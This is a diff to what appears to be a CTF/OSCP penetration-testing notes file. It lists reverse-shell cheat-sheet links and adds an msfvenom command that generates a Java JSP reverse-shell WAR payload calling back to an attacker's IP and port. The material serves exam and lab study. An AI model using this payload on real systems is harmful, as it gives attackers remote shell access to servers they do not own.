@@ -88,6 +88,10 @@ For CTF / OSCP, should not take you more than 30 mins to crack
 - msfvnon https://sushant747.gitbooks.io/total-oscp-guide/reverse-shell.html
 - https://highon.coffee/blog/reverse-shell-cheat-sheet/
 - https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit
+- http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/  J2EE war reverse shell: 
+    ```shell
+    msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
+    ```
 
 ## convert reverse shell to tty
 ```python
